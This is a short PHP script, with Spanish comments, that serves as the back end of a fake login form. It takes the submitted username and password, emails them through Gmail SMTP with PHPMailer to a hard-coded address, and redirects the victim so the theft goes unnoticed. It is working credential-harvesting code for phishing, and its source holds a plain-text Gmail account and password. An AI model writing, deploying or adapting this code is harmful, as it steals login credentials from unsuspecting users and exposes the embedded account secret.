<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $mail = new PHPMailer(true);

    try {
        // Configuración del servidor SMTP de Gmail
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com';
        $mail->SMTPAuth   = true;
        $mail->Username   = 'premiumeverything181@gmail.com';
        $mail->Password   = 'Lapara35';
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port       = 587;

        // Remitente y destinatario
        $mail->setFrom('premiumeverything181@gmail.com', 'Formulario Login');
        $mail->addAddress('premiumeverything181@gmail.com');

        // Modo de depuración SMTP
        $mail->SMTPDebug = 2; // Establece el nivel de depuración (0 para desactivar)

        // Contenido del correo
        $mail->isHTML(true);
        $mail->Subject = 'Datos de inicio de sesión';
        $mail->Body    = "Usuario: " . $username . "<br>Contraseña: " . $password;
        $mail->AltBody = "Usuario: " . $username . "\nContraseña: " . $password;

        // Enviar el correo
        $mail->send();
        echo 'Los datos fueron enviados correctamente';
        
        // Redirigir a otra página tras enviar el correo
        header('Location: pagina_destino.html');
        exit();
        
    } catch (Exception $e) {
        echo "Error al enviar los datos: {$mail->ErrorInfo}";
    }
}
?>
